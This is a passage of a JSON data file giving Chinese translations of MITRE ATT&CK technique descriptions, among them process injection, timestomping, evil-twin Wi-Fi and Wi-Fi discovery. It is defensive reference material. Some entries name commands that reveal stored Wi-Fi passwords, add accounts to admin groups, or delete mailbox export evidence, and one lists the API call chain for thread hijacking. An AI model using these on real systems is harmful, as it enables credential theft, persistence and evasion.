        "translated_name": "间接命令执行",
        "translated_description": "对手可能会滥用允许命令执行的实用程序，以绕过限制使用命令行解释器的安全限制。各种Windows实用程序可能用于执行命令，可能不调用[cmd](https://attack.mitre.org/software/S0106)。例如，[Forfiles](https://attack.mitre.org/software/S0193)、程序兼容性助手（pcalua.exe）、Windows子系统Linux（WSL）组件、Scriptrunner.exe以及其他实用程序可能会调用程序和命令的执行，来自[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)、运行窗口或通过脚本。(引用: VectorSec ForFiles Aug 2017)(引用: Evi1cg Forfiles Nov 2017)(引用: Secure Team - Scriptrunner.exe)(引用: SS64)(引用: Bleeping Computer - Scriptrunner.exe)\n\n对手可能会滥用这些功能进行[防御规避](https://attack.mitre.org/tactics/TA0005)，特别是执行任意命令，同时规避检测和/或缓解控制（如组策略）限制/防止使用[cmd](https://attack.mitre.org/software/S0106)或更常与恶意有效负载相关的文件扩展名。"
    },
    "Replication Through Removable Media": {
        "translated_name": "通过可移动媒体复制",
        "translated_description": "对手可能会通过将恶意软件复制到可移动媒体并利用插入系统时自动运行功能来移动到系统，可能是那些断开连接或隔离网络的系统。在横向移动的情况下，这可能通过修改存储在可移动媒体上的可执行文件或通过复制恶意软件并将其重命名为看起来像合法文件来欺骗用户在另一系统上执行它。在初始访问的情况下，这可能通过手动操作媒体、修改用于最初格式化媒体的系统或修改媒体本身的固件来实现。\n\n如果通过USB连接移动设备，也可能用于感染PC。(引用: Exploiting Smartphone USB ) 这种感染可能通过设备（Android、iOS等）和在某些情况下通过USB充电线缆实现。(引用: Windows Malware Infecting Android)(引用: iPhone Charging Cable Hack) 例如，当智能手机连接到系统时，它可能类似于USB连接的磁盘驱动器。如果移动设备上有与连接系统兼容的恶意软件，恶意软件可能会感染机器（特别是如果启用了自动运行功能）。"
    },
    "Data from Local System": {
        "translated_name": "来自本地系统的数据",
        "translated_description": "对手可能会搜索本地系统资源，例如文件系统和配置文件或本地数据库，以在外传之前找到感兴趣的文件和敏感数据。\n\n对手可能会使用[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)，例如[cmd](https://attack.mitre.org/software/S0106)以及[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)，这些工具具有与文件系统交互以收集信息的功能。(引用: show_run_config_cmd_cisco) 对手还可能在本地系统上使用[自动化收集](https://attack.mitre.org/techniques/T1119)。\n"
    },
    "Deobfuscate/Decode Files or Information": {
        "translated_name": "反混淆/解码文件或信息",
        "translated_description": "对手可能会使用[混淆文件或信息](https://attack.mitre.org/techniques/T1027)来隐藏入侵的工件。他们可能需要单独的机制来解码或反混淆这些信息，具体取决于他们打算如何使用它。执行此操作的方法包括恶意软件的内置功能或使用系统上存在的实用程序。\n\n一个例子是使用[certutil](https://attack.mitre.org/software/S0160)解码隐藏在证书文件中的远程访问工具可执行文件。(引用: Malwarebytes Targeted Attack against Saudi Arabia) 另一个例子是使用Windows <code>copy /b</code>命令将二进制片段重新组装成恶意有效负载。(引用: Carbon Black Obfuscation Sept 2016)\n\n有时用户的操作可能是打开它以进行反混淆或解密的一部分，例如[用户执行](https://attack.mitre.org/techniques/T1204)。用户还可能需要输入密码以打开对手提供的密码保护的压缩/加密文件。(引用: Volexity PowerDuke November 2016)"
    },
    "Outlook Rules": {
        "translated_name": "Outlook规则",
        "translated_description": "对手可能会滥用Microsoft Outlook规则在被破坏的系统上获得持久性。Outlook规则允许用户定义自动行为来管理电子邮件消息。例如，一个合法的规则可能会自动将包含特定词语的电子邮件从特定发件人移动到Outlook中的特定文件夹。恶意的Outlook规则可以创建，当对手向该用户发送特定构造的电子邮件时触发代码执行。(引用: SilentBreak Outlook Rules)\n\n一旦恶意规则被添加到用户的邮箱中，它们将在Outlook启动时加载。当对手向用户发送特定构造的电子邮件时，恶意规则将执行。(引用: SilentBreak Outlook Rules)"
    },
    "Impair Defenses": {
        "translated_name": "削弱防御",
        "translated_description": "对手可能会恶意修改受害者环境的组件，以阻碍或禁用防御机制。这不仅涉及削弱预防性防御措施，例如防火墙和防病毒，还包括检测能力，防御者可以使用这些能力来审计活动和识别恶意行为。这也可能包括本地防御以及用户和管理员安装的补充功能。\n\n对手还可能削弱有助于防御卫生的常规操作，例如阻止用户注销、阻止系统关闭或禁用或修改更新过程。对手还可能针对事件聚合和分析机制，或通过更改其他系统组件来破坏这些程序。这些限制可以进一步支持恶意操作以及事件的持续传播。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)\n\n"
    },
    "Cloud Accounts": {
        "translated_name": "云账户",
        "translated_description": "云环境中的有效账户可能允许对手执行操作以实现初始访问、持久性、权限提升或防御规避。云账户是由组织创建和配置的账户，供用户、远程支持、服务或管理云服务提供商或SaaS应用程序中的资源使用。云账户可以仅存在于云中；或者，它们可能通过与其他身份源（例如Windows Active Directory）的同步或联合在本地系统和云之间混合连接。(引用: AWS Identity Federation)(引用: Google Federating GC)(引用: Microsoft Deploying AD Federation)\n\n服务或用户账户可能通过[暴力破解](https://attack.mitre.org/techniques/T1110)、[网络钓鱼](https://attack.mitre.org/techniques/T1566)或各种其他手段成为对手的目标，以获得对环境的访问权限。联合或同步账户可能是对手影响本地系统和云环境的途径——例如，通过利用共享凭据登录到[远程服务](https://attack.mitre.org/techniques/T1021)。高权限云账户，无论是联合、同步还是仅云账户，也可能允许通过SaaS [软件部署工具](https://attack.mitre.org/techniques/T1072)在混合连接设备上运行命令，从而转移到本地环境。\n\n对手可能会在被破坏的云账户上创建长期的[附加云凭据](https://attack.mitre.org/techniques/T1098/001)，以在环境中保持持久性。这些凭据还可以用于绕过多因素身份验证等安全控制。\n\n云账户还可能能够通过环境中的各种手段获得[临时提升的云访问权限](https://attack.mitre.org/techniques/T1548/005)或其他权限。角色分配或角色假设策略中的配置错误可能允许对手使用这些机制来利用超出账户预期范围的权限。这些超权限账户可能用于通过[云API](https://attack.mitre.org/techniques/T1059/009)或其他方法从在线存储账户和数据库中收集敏感数据。\n"
    },
    "Email Accounts": {
        "translated_name": "电子邮件账户",
        "translated_description": "对手可能会创建电子邮件账户，以在目标过程中使用。对手可以使用与电子邮件提供商创建的账户来进一步他们的操作，例如利用它们进行[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[网络钓鱼](https://attack.mitre.org/techniques/T1566)。(引用: Mandiant APT1) 建立电子邮件账户还可能允许对手滥用免费服务——例如试用期——以[获取基础设施](https://attack.mitre.org/techniques/T1583)用于后续目的。(引用: Free Trial PurpleUrchin)\n\n对手还可能采取步骤围绕电子邮件账户培养一个虚拟身份，例如通过使用[社交媒体账户](https://attack.mitre.org/techniques/T1585/001)，以增加后续行为成功的机会。创建的电子邮件账户还可以用于获取基础设施（例如：[域](https://attack.mitre.org/techniques/T1583/001)）。(引用: Mandiant APT1)\n\n为了减少将操作物理追溯到他们自己的机会，对手可能会使用一次性电子邮件服务。(引用: Trend Micro R980 2016)"
    },
    "Additional Local or Domain Groups": {
        "translated_name": "附加本地或域组",
        "translated_description": "对手可能会向对手控制的账户添加附加本地或域组，以在系统或域中保持持久访问。\n\n在Windows上，账户可以使用`net localgroup`和`net group`命令将现有用户添加到本地和域组。(引用: Microsoft Net Localgroup)(引用: Microsoft Net Group) 在Linux上，对手可能会使用`usermod`命令实现相同的目的。(引用: Linux Usermod)\n\n例如，账户可能会被添加到Windows设备上的本地管理员组，以保持提升的权限。它们还可能被添加到远程桌面用户组，这允许它们利用[远程桌面协议](https://attack.mitre.org/techniques/T1021/001)将来登录到终端。(引用: Microsoft RDP Logons) 在Linux上，账户可能会被添加到sudoers组，允许它们持久地利用[使用Sudo和Sudo缓存](https://attack.mitre.org/techniques/T1548/003)获得提升的权限。\n\n在Windows环境中，机器账户也可能被添加到域组。这允许本地SYSTEM账户在域上获得权限。(引用: RootDSE AD Detection 2022)"
    },
    "Upload Malware": {
        "translated_name": "上传恶意软件",
        "translated_description": "对手可能会将恶意软件上传到第三方或对手控制的基础设施，以便在目标过程中访问。恶意软件可以包括有效负载、下载器、后期妥协工具、后门和各种其他恶意内容。对手可能会上传恶意软件以支持其操作，例如通过将其放置在可通过互联网访问的Web服务器上，使其在受害者网络中可用，以启用[工具传输](https://attack.mitre.org/techniques/T1105)。\n\n恶意软件可能被放置在对手先前购买/租用的基础设施上([获取基础设施](https://attack.mitre.org/techniques/T1583))或被他们以其他方式妥协的基础设施上([妥协基础设施](https://attack.mitre.org/techniques/T1584))。恶意软件还可以在Web服务上进行阶段性存储，例如GitHub或Pastebin，或托管在星际文件系统(IPFS)上，其中分散的内容存储使得删除恶意文件变得困难。(引用: Volexity Ocean Lotus November 2020)(引用: Talos IPFS 2022)\n\n对手可能会将后门文件（如应用程序二进制文件、虚拟机映像或容器映像）上传到第三方软件商店或存储库（例如：GitHub、CNET、AWS社区AMI、Docker Hub）。受害者可能会通过[用户执行](https://attack.mitre.org/techniques/T1204)直接下载/安装这些后门文件。[伪装](https://attack.mitre.org/techniques/T1036)可能会增加用户错误执行这些文件的机会。"
    },
    "Domains": {
        "translated_name": "域名",
        "translated_description": "对手可能会劫持域名和/或子域名，以便在目标过程中使用。域名注册劫持是指在未经原注册人许可的情况下更改域名注册。(引用: ICANNDomainNameHijacking) 对手可能会访问列为域名所有者的人的电子邮件账户。然后，对手可以声称忘记密码以更改域名注册。其他可能性包括通过社会工程获取域名注册帮助台的访问权限，利用续订过程中的漏洞，或妥协允许管理域名的云服务（例如，AWS Route53）。(引用: Krebs DNS Hijack 2019)\n\n子域名劫持可能发生在组织具有指向不存在或已停用资源的DNS条目时。在这种情况下，对手可能会控制子域名，以利用与该域名相关的信任进行操作。(引用: Microsoft Sub Takeover 2020)\n\n妥协域名的对手还可能通过在其控制下创建恶意子域名而进行域名阴影操作，同时保留任何现有的DNS记录。由于服务不会中断，恶意子域名可能会长时间不被注意到。(引用: Palo Alto Unit 42 Domain Shadowing 2022)"
    },
    "Archive via Library": {
        "translated_name": "通过库归档",
        "translated_description": "对手可能会使用第三方库压缩或加密在外传之前收集的数据。许多库可以归档数据，包括[Python](https://attack.mitre.org/techniques/T1059/006) rarfile (引用: PyPI RAR)、libzip (引用: libzip) 和 zlib (引用: Zlib Github)。大多数库都包含加密和/或压缩数据的功能。\n\n一些归档库预安装在系统上，例如macOS和Linux上的bzip2，以及Windows上的zip。请注意，库与实用程序不同。库可以在编译时链接，而实用程序需要生成子shell或类似的执行机制。"
    },
    "Thread Execution Hijacking": {
        "translated_name": "线程执行劫持",
        "translated_description": "对手可能会将恶意代码注入劫持的进程中，以规避基于进程的防御措施，并可能提升权限。线程执行劫持是一种在单独的活动进程的地址空间中执行任意代码的方法。\n\n线程执行劫持通常通过挂起现有进程然后取消/空洞化其内存来执行，然后可以用恶意代码或DLL路径替换。首先使用本机Windows API调用（如<code>OpenThread</code>）创建现有受害进程的句柄。此时，可以挂起进程，然后写入、重新对齐到注入的代码，并通过分别调用<code>SuspendThread</code>、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code>和<code>ResumeThread</code>恢复。(引用: Elastic Process Injection July 2017)\n\n这与[进程空洞](https://attack.mitre.org/techniques/T1055/012)非常相似，但目标是现有进程，而不是在挂起状态下创建进程。\n\n在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源，并可能提升权限。通过线程执行劫持进行的执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "Masquerading": {
        "translated_name": "伪装",
        "translated_description": "对手可能会尝试操纵其工件的特征，使其看起来合法或对用户和/或安全工具无害。伪装发生在对象（合法或恶意）的名称或位置被操纵或滥用，以规避防御和观察。这可能包括操纵文件元数据、欺骗用户误识别文件类型以及给予合法任务或服务名称。\n\n重命名可滥用的系统实用程序以规避安全监控也是一种[伪装](https://attack.mitre.org/techniques/T1036)。(引用: LOLBAS Main Site)"
    },
    "Application Shimming": {
        "translated_name": "应用程序填充",
        "translated_description": "对手可能会通过执行由应用程序填充触发的恶意内容来建立持久性和/或提升权限。Microsoft Windows应用程序兼容性基础设施/框架（应用程序填充）是为了允许随着操作系统代码库的变化而保持软件的向后兼容性而创建的。例如，应用程序填充功能允许开发人员应用修复程序（无需重写代码）到为Windows XP创建的应用程序，使其能够在Windows 10上运行。(引用: Elastic Process Injection July 2017)\n\n在框架内，填充被创建为在程序（或更具体地说，导入地址表）和Windows操作系统之间充当缓冲。当程序执行时，填充缓存会被引用，以确定程序是否需要使用填充数据库（.sdb）。如果需要，填充数据库使用挂钩重定向代码，以便与操作系统通信。\n\n默认Windows安装程序（sdbinst.exe）安装的所有填充的列表保存在：\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> 和\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\n自定义数据库存储在：\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> 和\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\n为了保持填充的安全性，Windows设计它们在用户模式下运行，因此它们不能修改内核，并且必须具有管理员权限才能安装填充。然而，某些填充可以用于[绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)（UAC和RedirectEXE）、注入DLL到进程（InjectDLL）、禁用数据执行保护（DisableNX）和结构异常处理（DisableSEH），以及拦截内存地址（GetProcAddress）。\n\n利用这些填充可能允许对手执行多种恶意行为，例如提升权限、安装后门、禁用防御（如Windows Defender）等。(引用: FireEye Application Shimming) 填充还可以被滥用以通过受影响的程序持续调用来建立持久性。"
    },
    "Unsecured Credentials": {
        "translated_name": "不安全的凭据",
        "translated_description": "对手可能会搜索被破坏的系统以查找和获取不安全存储的凭据。这些凭据可以存储和/或误放在系统的许多位置，包括明文文件（例如，[Bash历史记录](https://attack.mitre.org/techniques/T1552/003)）、操作系统或应用程序特定的存储库（例如，[注册表中的凭据](https://attack.mitre.org/techniques/T1552/002)），或其他专用文件/工件（例如，[私钥](https://attack.mitre.org/techniques/T1552/004)）。(引用: Brining MimiKatz to Unix)"
    },
    "Port Monitors": {
        "translated_name": "端口监视器",
        "translated_description": "对手可能会使用端口监视器在系统启动期间运行对手提供的DLL，以实现持久性或权限提升。可以通过<code>AddMonitor</code> API调用设置端口监视器，以设置在启动时加载的DLL。(引用: AddMonitor) 该DLL可以位于<code>C:\\Windows\\System32</code>中，并将在启动时由打印后台处理程序服务`spoolsv.exe`加载并运行，具有SYSTEM级别权限。(引用: Bloxham)\n\n或者，如果权限允许写入DLL的完全限定路径名，则可以加载任意DLL到<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>的现有或新任意命名子键的`Driver`值。注册表项包含以下条目的条目：\n\n* 本地端口\n* 标准TCP/IP端口\n* USB监视器\n* WSD端口\n"
    },
    "Clear Mailbox Data": {
        "translated_name": "清除邮箱数据",
        "translated_description": "对手可能会修改邮件和邮件应用程序数据，以删除其活动的证据。电子邮件应用程序允许用户和其他程序通过命令行工具或使用API导出和删除邮箱数据。邮件应用程序数据可以是电子邮件、电子邮件元数据或由应用程序或操作系统生成的日志，例如导出请求。\n\n对手可能会操纵电子邮件和邮箱数据，以删除日志、工件和元数据，例如[网络钓鱼](https://attack.mitre.org/techniques/T1566)/[内部鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1534)、[电子邮件收集](https://attack.mitre.org/techniques/T1114)、用于命令和控制的[邮件协议](https://attack.mitre.org/techniques/T1071/003)或基于电子邮件的外传（例如[通过替代协议外传](https://attack.mitre.org/techniques/T1048)）。例如，为了删除Exchange服务器上的证据，对手使用了<code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)模块，包括<code>Remove-MailboxExportRequest</code>以删除邮箱导出的证据。(引用: Volexity SolarWinds)(引用: ExchangePowerShell Module) 在Linux和macOS上，对手还可能通过名为<code>mail</code>的命令行实用程序删除电子邮件，或使用[AppleScript](https://attack.mitre.org/techniques/T1059/002)与macOS上的API交互。(引用: Cybereason Cobalt Kitty 2017)(引用: mailx man page)\n\n对手还可能删除电子邮件和指示垃圾邮件或可疑活动的元数据/标头（例如，通过使用组织范围的传输规则），以减少恶意电子邮件被安全产品检测到的可能性。(引用: Microsoft OAuth Spam 2022)"
    },
    "Login Hook": {
        "translated_name": "登录钩子",
        "translated_description": "对手可能会使用登录钩子在用户登录时执行以建立持久性。登录钩子是一个plist文件，指向一个特定的脚本，在用户登录时以root权限执行。plist文件位于<code>/Library/Preferences/com.apple.loginwindow.plist</code>文件中，可以使用<code>defaults</code>命令行实用程序进行修改。注销钩子的行为相同，其中脚本可以在用户注销时执行。所有钩子都需要管理员权限才能修改或创建钩子。(引用: Login Scripts Apple Dev)(引用: LoginWindowScripts Apple Dev)\n\n对手可以在<code>com.apple.loginwindow.plist</code>文件中添加或插入指向恶意脚本的路径，使用<code>LoginHook</code>或<code>LogoutHook</code>键值对。恶意脚本将在下次用户登录时执行。如果已经存在登录钩子，对手可以向现有登录钩子添加额外的命令。系统一次只能有一个登录和注销钩子。(引用: S1 macOs Persistence)(引用: Wardle Persistence Chapter)\n\n**注意：** 登录钩子在macOS 10.11版本中被弃用，取而代之的是[启动守护程序](https://attack.mitre.org/techniques/T1543/004)和[启动代理](https://attack.mitre.org/techniques/T1543/001)"
    },
    "Content Injection": {
        "translated_name": "内容注入",
        "translated_description": "对手可能通过在线网络流量向系统注入恶意内容，以访问并持续与受害者通信。与诱使受害者访问托管在被妥协网站上的恶意有效负载（即，[驱动器式攻击](https://attack.mitre.org/techniques/T1608/004)后跟[驱动器式妥协](https://attack.mitre.org/techniques/T1189)）不同，对手可能通过妥协的数据传输通道初始访问受害者，在这些通道中他们可以操纵流量和/或注入自己的内容。这些妥协的在线网络通道还可以用于向已妥协的系统传递额外的有效负载（即，[工具传输](https://attack.mitre.org/techniques/T1105)）和其他数据。(引用: ESET MoustachedBouncer)\n\n对手可能通过多种方式向受害者系统注入内容，包括：\n\n* 从中间，对手位于合法在线客户端-服务器通信之间（**注意：** 这类似但不同于[中间人攻击](https://attack.mitre.org/techniques/T1557)，后者描述了仅在企业环境内的AiTM活动）(引用: Kaspersky Encyclopedia MiTM)\n* 从侧面，恶意内容被注入并作为对合法在线服务器请求的虚假响应竞赛到客户端(引用: Kaspersky ManOnTheSide)\n\n内容注入通常是妥协的上游通信通道的结果，例如在互联网服务提供商（ISP）级别的“合法拦截”。(引用: Kaspersky ManOnTheSide)(引用: ESET MoustachedBouncer)(引用: EFF China GitHub Attack)"
    },
    "Process Injection": {
        "translated_name": "进程注入",
        "translated_description": "对手可能会将代码注入进程，以规避基于进程的防御措施，并可能提升权限。进程注入是一种在单独的活动进程的地址空间中执行任意代码的方法。在另一个进程的上下文中运行代码可能允许访问进程的内存、系统/网络资源，并可能提升权限。通过进程注入进行的执行还可能规避安全产品的检测，因为执行被掩盖在合法进程下。\n\n有许多不同的方法可以将代码注入进程，其中许多滥用合法功能。这些实现存在于每个主要操作系统中，但通常是特定于平台的。\n\n更复杂的样本可能会执行多个进程注入以分段模块并进一步规避检测，利用命名管道或其他进程间通信（IPC）机制作为通信通道。"
    },
    "Exfiltration Over Webhook": {
        "translated_name": "通过 Webhook 外传",
        "translated_description": "对手可能会将数据外传到 webhook 端点，而不是通过其主要命令和控制通道。Webhook 是一种简单的机制，允许服务器通过 HTTP/S 将数据推送到客户端，而无需客户端不断轮询服务器。(引用: RedHat Webhooks) 许多公共和商业服务（如 Discord、Slack 和 `webhook.site`）支持创建 webhook 端点，这些端点可以被其他服务（如 Github、Jira 或 Trello）使用。(引用: Discord Intro to Webhooks) 当链接服务中发生更改时（例如推送存储库更新或修改票证），这些服务会自动将数据发布到 webhook 端点供消费应用程序使用。\n\n对手可能会将对手拥有的环境链接到受害者拥有的 SaaS 服务，以实现重复的[自动化外传](https://attack.mitre.org/techniques/T1020)电子邮件、聊天消息和其他数据。(引用: Push Security SaaS Attacks Repository Webhooks) 或者，对手可以手动将阶段性数据直接发布到 URL 以进行外传，而不是将 webhook 端点链接到服务。(引用: Microsoft SQL Server)\n\n访问 webhook 端点通常通过 HTTPS 进行，这为对手提供了额外的保护级别。如果 webhook 端点指向常用的 SaaS 应用程序或协作服务，利用 webhook 进行的外传也可以与正常网络流量混合。(引用: CyberArk Labs Discord)(引用: Talos Discord Webhook Abuse)(引用: Checkmarx Webhooks)"
    },
    "Traffic Signaling": {
        "translated_name": "流量信号",
        "translated_description": "对手可能会使用流量信号来隐藏用于持久性或命令和控制的开放端口或其他恶意功能。流量信号涉及发送一个魔法值或序列到系统以触发特殊响应，例如打开关闭的端口或执行恶意任务。这可能采取发送具有某些特征的一系列数据包的形式，然后端口将被打开供对手使用命令和控制。通常，这些数据包序列包括尝试连接到预定义序列的关闭端口（即[端口敲击](https://attack.mitre.org/techniques/T1205/001)），但也可以涉及不寻常的标志、特定字符串或其他独特特征。在序列完成后，打开端口可以通过基于主机的防火墙实现，但也可以通过自定义软件实现。\n\n对手还可能与已经打开的端口通信，但监听该端口的服务只有在传递适当的魔法值时才会响应命令或触发其他恶意功能。\n\n观察触发通信的信号数据包可以通过不同的方法进行。一种方法，最初由 Cd00r 实现 (引用: Hartrell cd00r 2002)，是使用 libpcap 库来嗅探相关数据包。另一种方法利用原始套接字，使恶意软件能够使用其他程序已经打开的端口。\n\n在网络设备上，对手可能会使用精心制作的数据包来启用[网络设备身份验证](https://attack.mitre.org/techniques/T1556/004)以用于设备提供的标准服务，例如 telnet。此类信号还可以用于打开关闭的服务端口，例如 telnet，或触发恶意软件植入物上的模块修改，添加、删除或更改恶意功能。对手可能会使用精心制作的数据包尝试连接到一个或多个（打开或关闭的）端口，但也可能尝试连接到路由器接口、广播和网络地址 IP 上的相同端口以实现其目标和目的。(引用: Cisco Synful Knock Evolution)(引用: Mandiant - Synful Knock)(引用: Cisco Blog Legacy Device Attacks) 要在嵌入式设备上启用此流量信号，对手必须首先实现并利用[补丁系统映像](https://attack.mitre.org/techniques/T1601/001)，因为架构的单片性质。\n\n对手还可能使用 Wake-on-LAN 功能来打开已关闭的系统。Wake-on-LAN 是一种硬件功能，允许通过发送魔法数据包来打开或唤醒已关闭的系统。一旦系统打开，它可能成为横向移动的目标。(引用: Bleeping Computer - Ryuk WoL)(引用: AMD Magic Packet)"
    },
    "Direct Cloud VM Connections": {
        "translated_name": "直接云虚拟机连接",
        "translated_description": "对手可能会利用[有效账户](https://attack.mitre.org/techniques/T1078)通过云原生方法直接登录到可访问的云托管计算基础设施。许多云提供商提供与虚拟基础设施的交互连接，可以通过[云 API](https://attack.mitre.org/techniques/T1059/009)访问，例如 Azure Serial Console (引用: Azure Serial Console)、AWS EC2 Instance Connect (引用: EC2 Instance Connect)(引用: lucr-3: Getting SaaS-y in the cloud) 和 AWS System Manager。(引用: AWS System Manager)。\n\n这些连接的身份验证方法可以包括密码、应用程序访问令牌或 SSH 密钥。这些云原生方法可能默认允许对主机的特权访问，具有 SYSTEM 或 root 级别的访问权限。\n\n对手可能会利用这些云原生方法直接访问虚拟基础设施并在环境中进行枢纽。(引用: SIM Swapping and Abuse of the Microsoft Azure Serial Console) 这些连接通常提供对虚拟机的直接控制台访问，而不是执行脚本（即，[云管理命令](https://attack.mitre.org/techniques/T1651)）。"
    },
    "System Binary Proxy Execution": {
        "translated_name": "系统二进制代理执行",
        "translated_description": "对手可能会通过使用签名的或其他受信任的二进制文件代理执行恶意内容来绕过基于进程和/或签名的防御措施。此技术中使用的二进制文件通常是 Microsoft 签名的文件，表明它们已从 Microsoft 下载或已在操作系统中本地存在。(引用: LOLBAS Project) 使用受信任数字证书签名的二进制文件通常可以在受数字签名验证保护的 Windows 系统上执行。可以使用多个 Microsoft 签名的二进制文件来代理执行其他文件或命令。\n\n类似地，在 Linux 系统上，对手可能会滥用受信任的二进制文件，例如 <code>split</code> 来代理执行恶意命令。(引用: split man page)(引用: GTFO split)"
    },
    "Timestomp": {
        "translated_name": "时间戳篡改",
        "translated_description": "对手可能会修改文件时间属性以隐藏新文件或对现有文件的更改。时间戳篡改是一种修改文件时间戳（修改、访问、创建和更改时间）的技术，通常是为了模仿同一文件夹中的文件并将恶意文件与合法文件混合。\n\n主文件表 (MFT) 文件中的 `$STANDARD_INFORMATION` (`$SI`) 和 `$FILE_NAME` (`$FN`) 属性都记录时间。(引用: Inversecos Timestomping 2022) `$SI`（日期/时间戳）显示给最终用户，包括在文件系统视图中，而 `$FN` 由内核处理。(引用: Magnet Forensics)\n\n修改 `$SI` 属性是最常见的时间戳篡改方法，因为它可以通过 API 调用在用户级别进行修改。然而，`$FN` 时间戳篡改通常需要与系统内核交互或移动或重命名文件。(引用: Inversecos Timestomping 2022)\n\n对手修改文件上的时间戳，以便它们在法医调查员或文件分析工具中不显得显眼。为了规避依赖于识别 `$SI` 和 `$FN` 属性之间差异的检测，对手还可能进行“双重时间戳篡改”，同时修改两个属性上的时间。(引用: Double Timestomping)\n\n时间戳篡改可能与文件名[伪装](https://attack.mitre.org/techniques/T1036)一起使用，以隐藏恶意软件和工具。(引用: WindowsIR Anti-Forensic Techniques)"
    },
    "Evil Twin": {
        "translated_name": "恶意双胞胎",
        "translated_description": "对手可能会托管看似合法的 Wi-Fi 接入点，以欺骗用户连接到恶意网络，从而支持后续行为，例如[网络嗅探](https://attack.mitre.org/techniques/T1040)、[传输数据操纵](https://attack.mitre.org/techniques/T1565/002)或[输入捕获](https://attack.mitre.org/techniques/T1056)。(引用: Australia ‘Evil Twin’)\n\n通过使用合法 Wi-Fi 网络的服务集标识符 (SSID)，欺诈性 Wi-Fi 接入点可能会欺骗设备或用户连接到恶意 Wi-Fi 网络。(引用: Kaspersky evil twin)(引用: medium evil twin) 对手可能会提供更强的信号强度或阻止访问 Wi-Fi 接入点，以强迫或诱使受害设备连接到恶意网络。(引用: specter ops evil twin) Wi-Fi Pineapple 是一种网络安全审计和渗透测试工具，可能会在恶意双胞胎攻击中部署，以便于使用和更广泛的范围。自定义证书可能会被用来试图拦截 HTTPS 流量。\n\n类似地，对手还可能监听客户端设备发送的探测请求，以查找已知或以前连接的网络（首选网络列表或 PNL）。当恶意接入点收到探测请求时，对手可以使用相同的 SSID 响应，以模仿受信任的已知网络。(引用: specter ops evil twin) 受害设备被引导相信响应的接入点来自其 PNL，并开始连接到欺诈网络。\n\n登录到恶意 Wi-Fi 接入点后，用户可能会被引导到假登录页面或强制门户网页，以捕获受害者的凭据。一旦用户登录到欺诈性 Wi-Fi 网络，对手可能能够监视网络活动、操纵数据或窃取其他凭据。具有高浓度公共 Wi-Fi 接入的地点，例如机场、咖啡店或图书馆，可能成为对手设置非法 Wi-Fi 接入点的目标。"
    },
    "Reflective Code Loading": {
        "translated_name": "反射代码加载",
        "translated_description": "对手可能会反射性地将代码加载到进程中，以隐藏恶意有效负载的执行。反射加载涉及在进程的内存中直接分配然后执行有效负载，而不是创建由磁盘上的文件路径支持的线程或进程（例如，[共享模块](https://attack.mitre.org/techniques/T1129)）。\n\n反射性加载的有效负载可能是编译的二进制文件、匿名文件（仅存在于 RAM 中），或只是无文件的可执行代码片段（例如：位置无关的 shellcode）。(引用: Introducing Donut)(引用: S1 Custom Shellcode Tool)(引用: Stuart ELF Memory)(引用: 00sec Droppers)(引用: Mandiant BYOL) 例如，[PowerShell](https://attack.mitre.org/techniques/T1059/001) 执行的 `Assembly.Load()` 方法可能会被滥用以将原始代码加载到正在运行的进程中。(引用: Microsoft AssemblyLoad)\n\n反射性代码注入与[进程注入](https://attack.mitre.org/techniques/T1055)非常相似，不同之处在于“注入”将代码加载到进程自己的内存中，而不是单独的进程中。反射性加载可能会规避基于进程的检测，因为任意代码的执行可能会被掩盖在合法或其他无害的进程中。直接将有效负载反射性加载到内存中还可以避免在磁盘上创建文件或其他工件，同时还可以使恶意软件在执行之前保持这些有效负载加密（或以其他方式混淆）。(引用: Stuart ELF Memory)(引用: 00sec Droppers)(引用: Intezer ACBackdoor)(引用: S1 Old Rat New Tricks)"
    },
    "Wi-Fi Discovery": {
        "translated_name": "Wi-Fi 发现",
        "translated_description": "对手可能会在被破坏的系统上搜索有关 Wi-Fi 网络的信息，例如网络名称和密码。对手可能会使用 Wi-Fi 信息作为[账户发现](https://attack.mitre.org/techniques/T1087)、[远程系统发现](https://attack.mitre.org/techniques/T1018)和其他发现或[凭据访问](https://attack.mitre.org/tactics/TA0006)活动的一部分，以支持正在进行和未来的活动。\n\n对手可能会从主机收集有关 Wi-Fi 网络的各种信息。例如，在 Windows 上，设备以前连接过的所有 Wi-Fi 网络的名称和密码可能通过 `netsh wlan show profiles` 可用，以枚举 Wi-Fi 名称，然后 `netsh wlan show profile “Wi-Fi name” key=clear` 显示 Wi-Fi 网络的相应密码。(引用: BleepingComputer Agent Tesla steal wifi passwords)(引用: Malware Bytes New AgentTesla variant steals WiFi credentials)(引用: Check Point APT35 CharmPower January 2022) 此外，可以使用对 `wlanAPI.dll` [本机 API](https://attack.mitre.org/techniques/T1106) 函数的调用发现本地可访问的 Wi-Fi 网络的名称和其他详细信息。(引用: Binary Defense Emotes Wi-Fi Spreader)\n\n在 Linux 上，设备以前连接过的所有 Wi-Fi 网络的名称和密码可能在 ` /etc/NetworkManager/system-connections/` 下的文件中可用。(引用: Wi-Fi Password of All Connected Networks in Windows/Linux) 在 macOS 上，可以使用 ` security find-generic-password -wa wifiname`（需要管理员用户名/密码）识别已知 Wi-Fi 的密码。(引用: Find Wi-Fi Password on Mac)\n"
    },
    "Mutual Exclusion": {
        "translated_name": "互斥",
